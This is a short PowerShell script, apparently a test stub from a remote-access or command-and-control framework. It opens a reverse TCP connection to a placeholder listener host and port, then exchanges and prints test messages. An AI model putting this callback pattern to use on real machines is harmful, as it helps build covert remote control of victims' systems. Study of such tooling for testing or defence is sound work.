
$CONNECTIONMETHOD = "TCP" # TODO
$LHOST = "SYREPLACE_LHOST"
$LPORT = "SYREPLACE_LPORT"

if ($CONNECTIONMETHOD -eq "TCP") {
    $transport = Transport-ReverseTcp-Open -LHost $LHOST -LPort $LPORT
	$res = Message-ParseFromTransport $transport
	$res.content -join '' | Write-Output
	$message1 = Message-Create -MType 1 -Content "Test"
    Message-SendToTransport $message1 $transport
    $res = Message-ParseFromTransport $transport
	$res.content -join '' | Write-Output
    Transport-ReverseTcp-Close $transport
} else {
    Write-Output "ERROR: connection method not defined"
}

